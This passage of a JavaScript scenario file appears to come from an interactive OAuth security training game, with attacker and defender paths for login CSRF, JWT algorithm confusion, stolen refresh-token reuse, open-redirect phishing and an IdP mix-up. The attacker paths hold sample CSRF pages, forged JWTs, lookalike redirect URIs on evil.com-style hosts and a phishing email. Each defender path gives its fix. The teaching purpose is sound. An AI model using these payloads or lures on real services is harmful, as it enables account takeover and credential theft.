          narrative: "You create a page with a hidden image tag:",
          codeSnippet: `<html><body>
  <h1>Cute Cat Pictures!</h1>
  <!-- Hidden CSRF -->
  <img src="https://taxapp.com/callback?code=ATTACKER_CODE"
       style="display:none">
  <img src="cat.jpg">
</body></html>`,
          observation: "When victims load this, their browser requests the callback with YOUR code!",
          choices: [
            { id: 'deploy', text: 'Deploy the attack page', riskDelta: 10, successDelta: 15, next: 'deploy_attack' }
          ]
        },

        create_csrf: {
          id: 'create_csrf',
          title: 'Creating the CSRF Page',
          narrative: "You create an auto-submitting form:",
          codeSnippet: `<html>
<body onload="document.forms[0].submit()">
  <form method="GET" action="https://taxapp.com/callback">
    <input type="hidden" name="code" value="ATTACKER_CODE">
  </form>
  <p>Please wait...</p>
</body>
</html>`,
          observation: "Victims visiting this will complete YOUR OAuth flow!",
          choices: [
            { id: 'deploy', text: 'Deploy and lure victims', riskDelta: 15, successDelta: 20, next: 'deploy_attack' }
          ]
        },

        deploy_attack: {
          id: 'deploy_attack',
          title: 'Deploying the Attack',
          narrative: "Get victims to visit your page while logged into the tax app:",
          choices: [
            { id: 'email', text: 'Email link disguised as tax info', riskDelta: 20, successDelta: 25, consequence: "Targeted, might be filtered", next: 'execute_attack' },
            { id: 'forum', text: 'Post on tax preparation forums', riskDelta: 15, successDelta: 20, consequence: "Reaches interested users", next: 'execute_attack' },
            { id: 'ads', text: 'Buy ads targeting tax users', riskDelta: 25, successDelta: 30, consequence: "Wide reach but evidence trail", next: 'ad_detected' }
          ]
        },

        ad_detected: {
          id: 'ad_detected',
          title: 'Ads Rejected',
          isFailure: true,
          failureType: 'detected',
          narrative: "The ad network detected your malicious landing page!",
          codeSnippet: `Google Ads Policy Violation:
- Malicious redirect detected
- Auto-form submission detected
- Account suspended`,
          learningMoment: {
            title: "Ad Network Security",
            explanation: "Major ad networks scan landing pages for malicious behavior including auto-redirects and CSRF attempts.",
            recommendation: "Direct social engineering often works better for CSRF attacks."
          },
          choices: [
            { id: 'retry', text: 'Use forum posting instead', next: 'execute_attack', riskDelta: 10, successDelta: -10 }
          ]
        },

        execute_attack: {
          id: 'execute_attack',
          title: 'Executing the Attack',
          narrative: "A victim clicks your link while logged into the tax app...",
          configCheck: 'requireStateParam',
          onSecure: {
            title: 'Attack Blocked!',
            narrative: "The application rejects the callback:",
            codeSnippet: `Error: CSRF Detected

State parameter mismatch.
Session state: (none)
Callback state: (none)

This appears to be a CSRF attempt.`,
            explanation: "The app uses state parameter validation! Since the victim never initiated this flow, there's no matching state in their session.",
            endingType: 'blocked'
          },
          onVulnerable: {
            title: 'Attack Succeeded!',
            narrative: "The app accepts the callback and logs the victim into YOUR account!",
            codeSnippet: `// Victim's browser:
Welcome to TaxPrep Pro!
Connected: attacker@evil.com  <- YOUR account!

// Victim enters:
- Social Security Number
- Bank account details
- Income information

// All saved to YOUR account!`,
            explanation: "Without state validation, the app can't tell if the callback was initiated by the victim or an attacker. The victim is using YOUR account, and their sensitive data belongs to you!",
            endingType: 'success'
          }
        }
      }
    },

    defender: {
      intro: "Users report their tax data appearing in accounts they don't recognize. Your security team suspects a CSRF vulnerability in the OAuth callback...",
      goal: "Implement state parameter validation to prevent CSRF attacks on the OAuth callback.",
      initialRisk: 0,
      initialSuccess: 100,

      steps: {
        start: {
          id: 'start',
          title: 'Analyzing the Issue',
          narrative: "You examine the OAuth callback handler:",
          codeSnippet: `// Current callback:
app.get('/callback', async (req, res) => {
  const code = req.query.code;
  const tokens = await exchangeCode(code);
  req.session.user = tokens.user;
  res.redirect('/dashboard');
  // NO STATE VALIDATION!
});`,
          observation: "The callback doesn't verify the OAuth flow was initiated by this user!",
          showControls: ['requireStateParam'],
          choices: [
            { id: 'implement', text: 'Implement state parameter validation', riskDelta: 0, successDelta: 30, next: 'implement_state' },
            { id: 'research', text: 'Research CSRF protection best practices', riskDelta: 0, successDelta: 15, next: 'research' }
          ]
        },

        research: {
          id: 'research',
          title: 'CSRF Protection Research',
          narrative: "You study OAuth 2.0 security recommendations:",
          codeSnippet: `RFC 6749 Section 10.12:
"The client MUST implement CSRF protection for its
redirection URI... typically accomplished by including
a value that binds the request to the user-agent's
authenticated state (e.g., hash of session cookie)"

Best practice: Unpredictable 'state' parameter`,
          choices: [
            { id: 'implement', text: 'Implement the state parameter', riskDelta: 0, successDelta: 25, next: 'implement_state' }
          ]
        },

        implement_state: {
          id: 'implement_state',
          title: 'Implementing State Validation',
          narrative: "Generate and validate a state parameter:",
          instruction: "Enable 'Require State Parameter' to enforce CSRF protection.",
          showControls: ['requireStateParam'],
          codeSnippet: `// Updated implementation:

// 1. Generate state before redirect:
app.get('/login', (req, res) => {
  const state = crypto.randomBytes(32).toString('hex');
  req.session.oauthState = state;
  const authUrl = \`/authorize?...&state=\${state}\`;
  res.redirect(authUrl);
});

// 2. Validate in callback:
app.get('/callback', (req, res) => {
  if (req.query.state !== req.session.oauthState) {
    return res.status(403).send('CSRF detected');
  }
  // proceed...
});`,
          configCheck: 'requireStateParam',
          onSecure: {
            title: 'State Validation Enabled',
            narrative: "Your OAuth flow is now protected against CSRF:",
            codeSnippet: `// Attack attempt:
Attacker's page -> Victim -> /callback?code=ATTACKER_CODE

Session state: "7a8b9c..." (from victim's flow)
Callback state: undefined  (attacker didn't set one)

Result: REJECTED - State mismatch`,
            explanation: "The state parameter is cryptographically random and bound to the user's session. Attackers cannot guess or forge it!",
            endingType: 'success'
          },
          onVulnerable: {
            title: 'Still Vulnerable',
            narrative: "Without state validation, CSRF attacks remain possible.",
            instruction: "Enable state validation to secure your OAuth flow.",
            continueDisabled: true
          }
        }
      }
    }
  },

  // ========== NEW STORY SCENARIOS ==========

  {
    id: 'jwt_forgery',
    title: 'The Algorithm Trick',
    category: 'Token Security',
    difficulty: 'advanced',
    estimatedTime: '12 min',
    description: 'Weak JWT validation allows attackers to forge tokens by manipulating the signing algorithm.',

    vulnerableConfig: { enforceJwtAlgorithm: false },
    secureConfig: { enforceJwtAlgorithm: true },

    attacker: {
      intro: "You've obtained a valid JWT from an API that uses RS256 signing. The public key is available at the JWKS endpoint. You wonder if the server properly validates the algorithm...",
      goal: "Forge a token with admin privileges by exploiting algorithm confusion.",
      initialRisk: 20,
      initialSuccess: 30,

      steps: {
        start: {
          id: 'start',
          title: 'Analyzing the Token',
          narrative: "You decode the JWT you obtained:",
          codeSnippet: `// Header:
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-1"
}

// Payload:
{
  "sub": "user_12345",
  "role": "user",
  "aud": "api.example.com",
  "exp": 1699999999
}`,
          observation: "The token uses RS256 (RSA asymmetric signing). You want to become 'admin'...",
          choices: [
            { id: 'get_pubkey', text: 'Fetch the public key from JWKS endpoint', riskDelta: 5, successDelta: 15, consequence: "Need the key for the attack", next: 'fetch_jwks' },
            { id: 'try_none', text: 'Try algorithm: none attack directly', riskDelta: 15, successDelta: 10, consequence: "Quick test but often blocked", next: 'try_none_alg' }
          ]
        },

        try_none_alg: {
          id: 'try_none_alg',
          title: 'Testing "alg: none"',
          narrative: "You create a token with no signature:",
          codeSnippet: `// Forged token:
{
  "alg": "none",
  "typ": "JWT"
}
.
{
  "sub": "admin",
  "role": "admin"
}
.
(no signature)`,
          observation: "Sending to the API...",
          choices: [
            { id: 'send_none', text: 'Send the unsigned token', riskDelta: 10, successDelta: 5, next: 'none_result' }
          ]
        },

        none_result: {
          id: 'none_result',
          title: '"None" Algorithm Rejected',
          isFailure: true,
          failureType: 'blocked',
          narrative: "The server rejects tokens with 'alg: none':",
          codeSnippet: `{
  "error": "invalid_token",
  "details": "Algorithm 'none' is not allowed"
}`,
          learningMoment: {
            title: "The 'None' Algorithm",
            explanation: "Most modern JWT libraries reject 'alg: none' by default. This was a common vulnerability (CVE-2015-9235) but is now well-known. However, the RS256→HS256 confusion attack may still work!",
            recommendation: "Try the algorithm confusion attack using the public key as an HMAC secret."
          },
          choices: [
            { id: 'try_confusion', text: 'Try RS256→HS256 confusion', next: 'fetch_jwks', riskDelta: 5, successDelta: 10 }
          ]
        },

        fetch_jwks: {
          id: 'fetch_jwks',
          title: 'Fetching the Public Key',
          narrative: "You retrieve the JWKS from the well-known endpoint:",
          codeSnippet: `GET /.well-known/jwks.json

{
  "keys": [{
    "kty": "RSA",
    "kid": "key-1",
    "use": "sig",
    "n": "0vx7agoebGcQ...",  // RSA modulus
    "e": "AQAB"              // RSA exponent
  }]
}`,
          observation: "You have the public key! In RS256, this verifies signatures. But in HS256, secrets create signatures...",
          choices: [
            { id: 'craft_hs256', text: 'Craft HS256 token signed with public key', riskDelta: 15, successDelta: 25, consequence: "The classic algorithm confusion attack", next: 'craft_forged' }
          ]
        },

        craft_forged: {
          id: 'craft_forged',
          title: 'Crafting the Forged Token',
          narrative: "You create a new token with elevated privileges:",
          codeSnippet: `// New header - changed to HS256!
{
  "alg": "HS256",  // <- Changed from RS256
  "typ": "JWT"
}

// New payload - you're admin now!
{
  "sub": "admin",
  "role": "admin",
  "aud": "api.example.com",
  "exp": 1799999999
}

// Sign with public key as HMAC secret
signature = HMAC-SHA256(header.payload, publicKey)`,
          observation: "If the server uses the public key to verify HS256 tokens, your forged token will validate!",
          choices: [
            { id: 'send_forged', text: 'Send the forged admin token', riskDelta: 20, successDelta: 30, next: 'attempt_forgery' }
          ]
        },

        attempt_forgery: {
          id: 'attempt_forgery',
          title: 'Sending the Forged Token',
          narrative: "You send a request with your crafted token:",
          codeSnippet: `GET /api/admin/users
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...`,
          configCheck: 'enforceJwtAlgorithm',
          onSecure: {
            title: 'Attack Blocked!',
            narrative: "The server enforces algorithm validation:",
            codeSnippet: `{
  "error": "invalid_token",
  "details": "Algorithm mismatch: expected RS256, got HS256"
}`,
            explanation: "The server is configured to only accept RS256 tokens. It doesn't derive the algorithm from the token header - it's hardcoded! Your algorithm confusion attack fails.",
            endingType: 'blocked'
          },
          onVulnerable: {
            title: 'Attack Succeeded!',
            narrative: "The server accepts your forged token!",
            codeSnippet: `HTTP/1.1 200 OK

{
  "users": [
    {"id": 1, "email": "ceo@company.com", "role": "admin"},
    {"id": 2, "email": "cto@company.com", "role": "admin"},
    ...
  ],
  "total": 1547
}`,
            explanation: "The vulnerable server reads the algorithm from the token header and uses the public key for both RS256 verification AND HS256 verification. Since you know the public key, you can sign any token you want!",
            endingType: 'success'
          }
        }
      }
    },

    defender: {
      intro: "A security audit revealed that your JWT validation library accepts multiple algorithms. An attacker could potentially forge tokens by exploiting algorithm confusion...",
      goal: "Configure strict algorithm enforcement to prevent token forgery.",
      initialRisk: 0,
      initialSuccess: 100,

      steps: {
        start: {
          id: 'start',
          title: 'Understanding the Vulnerability',
          narrative: "You examine your current JWT validation code:",
          codeSnippet: `// VULNERABLE: Algorithm from token header
const decoded = jwt.verify(token, publicKey);

// The library reads 'alg' from the token itself!
// If alg=HS256, it uses publicKey as HMAC secret
// Attacker can forge tokens with known public key!`,
          observation: "The algorithm is read from the untrusted token header. This is CVE-2015-9235!",
          showControls: ['enforceJwtAlgorithm'],
          choices: [
            { id: 'fix', text: 'Implement algorithm enforcement', riskDelta: 0, successDelta: 30, next: 'implement_fix' },
            { id: 'research', text: 'Research the vulnerability first', riskDelta: 0, successDelta: 15, next: 'research' }
          ]
        },

        research: {
          id: 'research',
          title: 'Understanding Algorithm Confusion',
          narrative: "You study the attack mechanism:",
          codeSnippet: `Algorithm Confusion Attack:

1. Server uses RS256 (asymmetric)
   - Private key: signs tokens
   - Public key: verifies tokens (public!)

2. Attacker changes header to HS256 (symmetric)
   - Same key signs AND verifies

3. If server uses public key for HS256...
   - Attacker signs with public key
   - Server verifies with public key
   - VALID TOKEN! Complete forgery.`,
          observation: "The public key is public by design, so anyone can forge tokens!",
          choices: [
            { id: 'fix', text: 'Fix the vulnerability now', riskDelta: 0, successDelta: 25, next: 'implement_fix' }
          ]
        },

        implement_fix: {
          id: 'implement_fix',
          title: 'Enforcing Algorithm Whitelist',
          narrative: "Update your JWT validation to enforce a specific algorithm:",
          instruction: "Enable 'Enforce JWT Algorithm' to only accept tokens with the expected algorithm.",
          showControls: ['enforceJwtAlgorithm'],
          codeSnippet: `// SECURE: Explicit algorithm enforcement
const decoded = jwt.verify(token, publicKey, {
  algorithms: ['RS256']  // ONLY accept RS256
});

// Now if token has alg=HS256, it's rejected
// regardless of signature validity!`,
          configCheck: 'enforceJwtAlgorithm',
          onSecure: {
            title: 'Algorithm Enforcement Enabled',
            narrative: "Your JWT validation now enforces the expected algorithm:",
            codeSnippet: `// Token verification flow:
1. Read algorithm from token: "HS256"
2. Check against whitelist: ["RS256"]
3. "HS256" not in whitelist
4. REJECT - algorithm not allowed

// Attacker cannot:
// - Use "alg: none"
// - Switch to HS256
// - Use any other algorithm`,
            explanation: "By enforcing a specific algorithm, you've eliminated the algorithm confusion attack. The token's algorithm header is now ignored - you know what algorithm your tokens use!",
            endingType: 'success'
          },
          onVulnerable: {
            title: 'Still Vulnerable',
            narrative: "Without algorithm enforcement, tokens can still be forged.",
            instruction: "Enable algorithm enforcement to secure your JWT validation.",
            continueDisabled: true
          }
        }
      }
    }
  },

  {
    id: 'refresh_persistence',
    title: 'The Persistent Intruder',
    category: 'Token Security',
    difficulty: 'intermediate',
    estimatedTime: '10 min',
    description: 'Stolen refresh tokens allow attackers to maintain access even after the victim changes their password.',

    vulnerableConfig: { enableRefreshTokenRotation: false },
    secureConfig: { enableRefreshTokenRotation: true, bindTokenToClient: true },

    attacker: {
      intro: "You compromised a user's device temporarily and extracted their refresh token. They've since secured their device and changed their password, but you still have that refresh token...",
      goal: "Use the stolen refresh token to maintain persistent access despite the user's remediation efforts.",
      initialRisk: 25,
      initialSuccess: 40,

      steps: {
        start: {
          id: 'start',
          title: 'Examining the Stolen Token',
          narrative: "You examine the refresh token you extracted:",
          codeSnippet: `Stolen Refresh Token:
ref_7x8y9z_abcdef123456

Token Info:
- User: victim@company.com
- Issued: 3 days ago
- Expires: 30 days from issue
- Scopes: read write`,
          observation: "The token was issued before the password change. Will it still work?",
          choices: [
            { id: 'try_refresh', text: 'Try to use the refresh token', riskDelta: 15, successDelta: 20, consequence: "Direct approach - see if it works", next: 'attempt_refresh' },
            { id: 'wait', text: 'Wait a few days to avoid detection', riskDelta: -5, successDelta: 5, consequence: "More stealthy but token might expire", next: 'delayed_attempt' }
          ]
        },

        delayed_attempt: {
          id: 'delayed_attempt',
          title: 'Delayed Access Attempt',
          narrative: "You wait 3 days to reduce suspicion, then try the token:",
          codeSnippet: `Day 6 since token theft:
- User has changed password
- User has logged out of all sessions
- User believes they are safe...`,
          choices: [
            { id: 'try_now', text: 'Attempt to use the refresh token', riskDelta: 10, successDelta: 15, next: 'attempt_refresh' }
          ]
        },

        attempt_refresh: {
          id: 'attempt_refresh',
          title: 'Using the Refresh Token',
          narrative: "You send a token refresh request:",
          codeSnippet: `POST /oauth/token HTTP/1.1
Host: auth.company.com
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token
&refresh_token=ref_7x8y9z_abcdef123456
&client_id=mobile-app`,
          configCheck: 'enableRefreshTokenRotation',
          onSecure: {
            title: 'Attack Blocked!',
            narrative: "The server rejects your refresh token:",
            codeSnippet: `{
  "error": "invalid_grant",
  "error_description": "Refresh token has been revoked"
}

// Server log:
[SECURITY] Attempted reuse of rotated token
User: victim@company.com
Action: All tokens revoked, user notified`,
            explanation: "The server implements refresh token rotation! When the legitimate user refreshed their token, a new one was issued and the old one was invalidated. Your stolen token is now useless, and the suspicious reuse attempt triggered additional security measures.",
            endingType: 'blocked'
          },
          onVulnerable: {
            title: 'Attack Succeeded!',
            narrative: "The server issues you new tokens!",
            codeSnippet: `{
  "access_token": "eyJhbGciOiJSUzI1NiIs...",
  "refresh_token": "ref_7x8y9z_abcdef123456",
  "token_type": "Bearer",
  "expires_in": 3600
}

// You now have:
// - Fresh access token
// - Same refresh token (reusable!)`,
            explanation: "Without refresh token rotation, the stolen token remains valid indefinitely! Password changes don't invalidate refresh tokens. You now have persistent access until the token expires in 30 days - or forever if you keep refreshing!",
            next: 'persistent_access'
          }
        },

        persistent_access: {
          id: 'persistent_access',
          title: 'Maintaining Persistence',
          narrative: "You've established persistent access:",
          codeSnippet: `Your access timeline:
Day 0:  Stole refresh token
Day 3:  User changed password
Day 6:  You refresh -> new access token!
Day 7:  User logout all sessions
Day 8:  You refresh -> still works!
Day 30: Token expires? Just refresh again!

Victim believes they're safe.
You have indefinite access.`,
          choices: [
            { id: 'exfiltrate', text: 'Begin exfiltrating data', riskDelta: 25, successDelta: 30, next: 'success_exfil' }
          ]
        },

        success_exfil: {
          id: 'success_exfil',
          title: 'Data Exfiltration',
          narrative: "You access the victim's resources:",
          codeSnippet: `GET /api/user/data
Authorization: Bearer (your fresh token)

Response: All user data, documents, messages...

You maintain access for weeks,
exfiltrating data at your leisure.`,
          explanation: "This is the danger of refresh tokens without rotation. They provide long-term persistent access that survives most remediation attempts.",
          endingType: 'success'
        }
      }
    },

    defender: {
      intro: "Security analysis shows that stolen refresh tokens remain valid indefinitely, even after password changes. Users have no way to revoke compromised tokens...",
      goal: "Implement refresh token rotation to limit the impact of token theft.",
      initialRisk: 0,
      initialSuccess: 100,

      steps: {
        start: {
          id: 'start',
          title: 'Understanding the Risk',
          narrative: "You analyze your current refresh token behavior:",
          codeSnippet: `Current Implementation:
- Refresh tokens valid for 30 days
- Same token can be used multiple times
- Password change doesn't revoke tokens
- No device/client binding

Risk: Stolen token = 30 days of access
      (or indefinite if attacker keeps refreshing)`,
          observation: "Refresh tokens are a major persistence vector for attackers!",
          showControls: ['enableRefreshTokenRotation', 'bindTokenToClient'],
          choices: [
            { id: 'enable_rotation', text: 'Enable refresh token rotation', riskDelta: 0, successDelta: 30, next: 'implement_rotation' },
            { id: 'analyze', text: 'Analyze attack scenarios first', riskDelta: 0, successDelta: 15, next: 'analyze_attacks' }
          ]
        },

        analyze_attacks: {
          id: 'analyze_attacks',
          title: 'Attack Scenario Analysis',
          narrative: "You map out the attack timeline:",
          codeSnippet: `Attack Timeline (current state):
┌─────────────────────────────────────────┐
│ Day 0: Attacker steals refresh token    │
│ Day 1: User notices suspicious activity │
│ Day 2: User changes password            │
│ Day 3: Attacker uses stolen token ✓     │
│ Day 4: User logs out all sessions       │
│ Day 5: Attacker refreshes again ✓       │
│ ...                                     │
│ Day 30: Attacker still has access ✓     │
└─────────────────────────────────────────┘`,
          observation: "The refresh token survives all user remediation attempts!",
          choices: [
            { id: 'fix', text: 'Implement rotation to fix this', riskDelta: 0, successDelta: 25, next: 'implement_rotation' }
          ]
        },

        implement_rotation: {
          id: 'implement_rotation',
          title: 'Implementing Token Rotation',
          narrative: "You implement refresh token rotation:",
          instruction: "Enable 'Refresh Token Rotation' to issue new tokens on each refresh and invalidate old ones.",
          showControls: ['enableRefreshTokenRotation', 'bindTokenToClient'],
          codeSnippet: `// Rotation implementation:
function refreshToken(oldToken) {
  // 1. Validate old token
  const grant = validateRefreshToken(oldToken);

  // 2. Check if token was already used
  if (grant.tokenUsed) {
    // BREACH DETECTED!
    revokeAllTokensForGrant(grant.id);
    alertSecurityTeam(grant.userId);
    throw new Error('Token reuse detected');
  }

  // 3. Mark old token as used
  markTokenAsUsed(oldToken);

  // 4. Issue new refresh token
  return issueNewTokens(grant);
}`,
          configCheck: 'enableRefreshTokenRotation',
          onSecure: {
            title: 'Rotation Enabled',
            narrative: "Refresh token rotation is now active:",
            codeSnippet: `New Attack Timeline:
┌─────────────────────────────────────────┐
│ Day 0: Attacker steals refresh token    │
│ Day 1: User refreshes -> NEW token      │
│        (old token now invalid!)         │
│ Day 2: Attacker tries stolen token      │
│        -> REJECTED (already used)       │
│        -> All user tokens revoked       │
│        -> Security team alerted         │
└─────────────────────────────────────────┘`,
            explanation: "With rotation, each refresh token can only be used once. When the legitimate user refreshes, the attacker's stolen token becomes invalid. Any attempt to reuse it triggers security alerts and revokes all tokens!",
            endingType: 'success'
          },
          onVulnerable: {
            title: 'Still Vulnerable',
            narrative: "Without rotation, stolen refresh tokens remain a persistent threat.",
            instruction: "Enable refresh token rotation to protect against token theft.",
            continueDisabled: true
          }
        }
      }
    }
  },

  {
    id: 'oauth_phishing',
    title: 'The Trusted Redirect',
    category: 'Code Flow Attacks',
    difficulty: 'intermediate',
    estimatedTime: '8 min',
    description: 'Attackers abuse the OAuth endpoint as an open redirector to create convincing phishing URLs.',

    vulnerableConfig: { strictRedirectUri: false, allowWildcardRedirects: true },
    secureConfig: { strictRedirectUri: true, allowWildcardRedirects: false },

    attacker: {
      intro: "You want to phish users of a popular service, but their email security blocks known phishing domains. You notice their OAuth provider might have loose redirect validation...",
      goal: "Use the trusted OAuth authorization endpoint to redirect victims to your phishing site.",
      initialRisk: 15,
      initialSuccess: 35,

      steps: {
        start: {
          id: 'start',
          title: 'Probing Redirect Validation',
          narrative: "You test the authorization endpoint's redirect validation:",
          codeSnippet: `Test 1 - Legitimate redirect:
/authorize?redirect_uri=https://app.example.com/callback
Result: ✓ Accepted

Test 2 - Subdomain variation:
/authorize?redirect_uri=https://evil.app.example.com/callback
Result: ???`,
          choices: [
            { id: 'test_subdomain', text: 'Test subdomain manipulation', riskDelta: 10, successDelta: 15, next: 'subdomain_test' },
            { id: 'test_path', text: 'Test path manipulation', riskDelta: 5, successDelta: 10, next: 'path_test' }
          ]
        },

        subdomain_test: {
          id: 'subdomain_test',
          title: 'Testing Subdomain Tricks',
          narrative: "You try various subdomain manipulations:",
          codeSnippet: `Test A: https://app.example.com.evil.com/callback
Test B: https://evil.app.example.com/callback
Test C: https://app-example.com/callback`,
          configCheck: 'strictRedirectUri',
          onSecure: {
            title: 'Validation Too Strict',
            narrative: "All subdomain tricks are rejected:",
            codeSnippet: `{
  "error": "invalid_redirect_uri",
  "error_description": "Must exactly match registered URI"
}`,
            explanation: "Strict validation only accepts exact URI matches. No subdomain manipulation works.",
            endingType: 'blocked'
          },
          onVulnerable: {
            title: 'Subdomain Accepted!',
            narrative: "The server accepts your subdomain trick!",
            codeSnippet: `https://app.example.com.evil.com/callback
Result: ✓ ACCEPTED!

The server only checks if the redirect starts
with the registered domain prefix!`,
            next: 'craft_phishing'
          }
        },

        path_test: {
          id: 'path_test',
          title: 'Testing Path Manipulation',
          narrative: "You try path-based attacks:",
          codeSnippet: `Test: /callback?next=https://evil.com
Test: /callback/../../../evil
Test: /callback#@evil.com`,
          observation: "Most of these are blocked, but let's try subdomains...",
          choices: [
            { id: 'subdomain', text: 'Try subdomain manipulation', riskDelta: 5, successDelta: 10, next: 'subdomain_test' }
          ]
        },

        craft_phishing: {
          id: 'craft_phishing',
          title: 'Crafting the Phishing Campaign',
          narrative: "You create a convincing phishing setup:",
          codeSnippet: `Your infrastructure:
1. Register: app.example.com.evil.com
2. Set up fake login page mimicking example.com
3. Craft OAuth URL:

https://auth.example.com/authorize?
  client_id=legitimate-app
  &redirect_uri=https://app.example.com.evil.com/steal
  &response_type=code
  &scope=openid profile`,
          observation: "The URL starts with the trusted auth.example.com domain!",
          choices: [
            { id: 'send_phish', text: 'Launch phishing campaign', riskDelta: 20, successDelta: 25, next: 'phishing_campaign' }
          ]
        },

        phishing_campaign: {
          id: 'phishing_campaign',
          title: 'Launching the Phishing Attack',
          narrative: "You send phishing emails with the OAuth link:",
          codeSnippet: `From: security@examp1e.com
Subject: Verify Your Account

Dear User,

We've detected unusual activity. Please verify
your account immediately:

[Verify Now]
-> https://auth.example.com/authorize?...

This link is safe - it's from auth.example.com!`,
          observation: "Users see a trusted domain and click...",
          choices: [
            { id: 'victim_clicks', text: 'Wait for victims to click', riskDelta: 15, successDelta: 20, next: 'victim_redirected' }
          ]
        },

        victim_redirected: {
          id: 'victim_redirected',
          title: 'Victim Redirected',
          narrative: "A victim clicks the link and is redirected to your site:",
          codeSnippet: `User journey:
1. Clicks "auth.example.com/authorize?..."
2. OAuth server processes request
3. Redirects to: app.example.com.evil.com
4. Victim sees fake login page
5. Enters credentials
6. You capture: email + password`,
          configCheck: 'strictRedirectUri',
          onSecure: {
            title: 'Attack Blocked!',
            narrative: "The OAuth server rejects the malicious redirect:",
            codeSnippet: `User sees error:
"Invalid redirect URI"

The phishing link doesn't work!`,
            explanation: "Strict redirect validation prevents the OAuth endpoint from being used as an open redirector.",
            endingType: 'blocked'
          },
          onVulnerable: {
            title: 'Credentials Captured!',
            narrative: "Your phishing attack succeeds:",
            codeSnippet: `Captured credentials:
- victim@company.com : Password123!
- cfo@company.com : Summer2024!
- admin@company.com : Qwerty789!

Total compromised: 47 accounts`,
            explanation: "By abusing the OAuth endpoint as an open redirector, you bypassed email security filters and exploited users' trust in the legitimate domain. This is why strict redirect validation is critical!",
            endingType: 'success'
          }
        }
      }
    },

    defender: {
      intro: "Your security team discovered phishing campaigns using your OAuth authorization endpoint as an open redirector. Attackers are exploiting users' trust in your domain...",
      goal: "Tighten redirect URI validation to prevent open redirect abuse.",
      initialRisk: 0,
      initialSuccess: 100,

      steps: {
        start: {
          id: 'start',
          title: 'Analyzing the Phishing Attack',
          narrative: "You examine the phishing URLs being used:",
          codeSnippet: `Reported phishing URLs:
https://auth.yourcompany.com/authorize?
  redirect_uri=https://yourcompany.com.evil.site/...

https://auth.yourcompany.com/authorize?
  redirect_uri=https://login-yourcompany.com/...

Users trust auth.yourcompany.com and click!`,
          observation: "Your OAuth endpoint is being weaponized against your own users!",
          showControls: ['strictRedirectUri', 'allowWildcardRedirects'],
          choices: [
            { id: 'fix', text: 'Implement strict validation', riskDelta: 0, successDelta: 30, next: 'implement_strict' },
            { id: 'audit', text: 'Audit current validation logic', riskDelta: 0, successDelta: 15, next: 'audit_validation' }
          ]
        },

        audit_validation: {
          id: 'audit_validation',
          title: 'Auditing Redirect Validation',
          narrative: "You examine the current validation code:",
          codeSnippet: `// VULNERABLE: Prefix-only matching
function validateRedirect(uri, registered) {
  return uri.startsWith(registered);
}

// This accepts:
// ✓ https://app.example.com/callback
// ✓ https://app.example.com.evil.com  <- BAD!
// ✓ https://app.example.com/callback/../evil`,
          observation: "The validation is too loose! Any URI starting with the registered one is accepted.",
          choices: [
            { id: 'fix', text: 'Fix the validation logic', riskDelta: 0, successDelta: 25, next: 'implement_strict' }
          ]
        },

        implement_strict: {
          id: 'implement_strict',
          title: 'Implementing Strict Validation',
          narrative: "You implement strict redirect URI matching:",
          instruction: "Enable 'Strict URI Matching' and disable 'Allow Wildcards'.",
          showControls: ['strictRedirectUri', 'allowWildcardRedirects'],
          codeSnippet: `// SECURE: Exact string matching
function validateRedirect(uri, registered) {
  // Normalize both URIs
  const normalizedUri = normalizeUrl(uri);
  const normalizedReg = normalizeUrl(registered);

  // Exact match only
  return normalizedUri === normalizedReg;
}

// Now rejects:
// ✗ https://app.example.com.evil.com
// ✗ https://app.example.com/callback/../x
// ✓ https://app.example.com/callback ONLY`,
          configCheck: 'strictRedirectUri',
          onSecure: {
            title: 'Strict Validation Enabled',
            narrative: "Your OAuth endpoint now rejects manipulated redirects:",
            codeSnippet: `Phishing attempt blocked:
redirect_uri=https://app.example.com.evil.com
Result: REJECTED - must match exactly

Your OAuth endpoint can no longer be
abused as an open redirector!`,
            explanation: "Strict validation ensures only pre-registered redirect URIs are accepted. Attackers can no longer abuse your trusted domain for phishing.",
            endingType: 'success'
          },
          onVulnerable: {
            title: 'Still Vulnerable',
            narrative: "Without strict validation, your OAuth endpoint remains an open redirect risk.",
            instruction: "Enable strict URI validation to protect your users.",
            continueDisabled: true
          }
        }
      }
    }
  },

  {
    id: 'idp_confusion',
    title: 'The Identity Mix-Up',
    category: 'Code Flow Attacks',
    difficulty: 'advanced',
    estimatedTime: '12 min',
    description: 'In multi-IdP environments, attackers can steal authorization codes by confusing clients about which IdP issued them.',

    vulnerableConfig: { validateIssuer: false },
    secureConfig: { validateIssuer: true, requirePkce: true },

    attacker: {
      intro: "You've discovered an enterprise app that supports multiple identity providers for SSO. You control one of the IdPs in the federation. Can you steal authorization codes from sessions with other IdPs?",
      goal: "Execute an authorization server mix-up attack to steal codes from legitimate IdP sessions.",
      initialRisk: 30,
      initialSuccess: 25,

      steps: {
        start: {
          id: 'start',
          title: 'Reconnaissance',
          narrative: "You analyze the application's IdP configuration:",
          codeSnippet: `Supported Identity Providers:
1. corporate-idp.company.com (legitimate)
2. partner-idp.partner.com   (legitimate)
3. evil-idp.attacker.com     (you control this!)

All use the same callback:
https://app.example.com/oauth/callback`,
          observation: "The app uses the same callback URL for all IdPs. This is the key to the attack!",
          choices: [
            { id: 'setup', text: 'Set up the mix-up attack', riskDelta: 20, successDelta: 20, consequence: "Complex but effective attack", next: 'setup_attack' },
            { id: 'analyze', text: 'Analyze the OAuth flow first', riskDelta: 10, successDelta: 15, next: 'analyze_flow' }
          ]
        },

        analyze_flow: {
          id: 'analyze_flow',
          title: 'Analyzing the OAuth Flow',
          narrative: "You study how the app handles multiple IdPs:",
          codeSnippet: `Normal flow:
1. User clicks "Login with Corporate IdP"
2. App stores: session.expectedIdp = "corporate"
3. App redirects to corporate-idp.company.com
4. User authenticates
5. Corporate IdP redirects to /callback?code=ABC
6. App exchanges code at corporate IdP

The vulnerability:
- App trusts the IdP based on session state
- But what if we manipulate the flow?`,
          choices: [
            { id: 'setup', text: 'Set up the attack', riskDelta: 15, successDelta: 20, next: 'setup_attack' }
          ]
        },

        setup_attack: {
          id: 'setup_attack',
          title: 'Setting Up the Mix-Up',
          narrative: "You prepare your malicious IdP:",
          codeSnippet: `Your evil IdP configuration:
1. User initiates login with YOUR IdP
2. App stores: session.expectedIdp = "evil-idp"
3. Instead of authenticating...
4. Your IdP redirects user to CORPORATE IdP
5. User authenticates with corporate credentials
6. Corporate IdP sends code to /callback
